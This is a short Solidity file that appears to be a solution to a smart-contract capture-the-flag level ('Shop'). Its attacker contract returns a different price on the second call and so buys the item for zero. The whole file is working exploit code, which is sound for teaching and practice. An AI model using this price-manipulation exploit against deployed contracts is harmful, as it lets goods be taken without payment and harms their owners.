// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*Solution:
Use contract address that has price function to call buy() because Shop contract enforce structure at compile time.
Change value of price as buy() call the price function two times so sending 100 satisfy first check 
    and sending 0 sets the price in Shop to 0.
Now you can buy at lower/zero price.
*/

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract MyContract {
    IShop target;

    constructor(address _target) {
        target = IShop(_target);
    }

    function callBuy() public {
        target.buy();
    }

    function price() public view returns (uint256) {
        if (target.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }
}

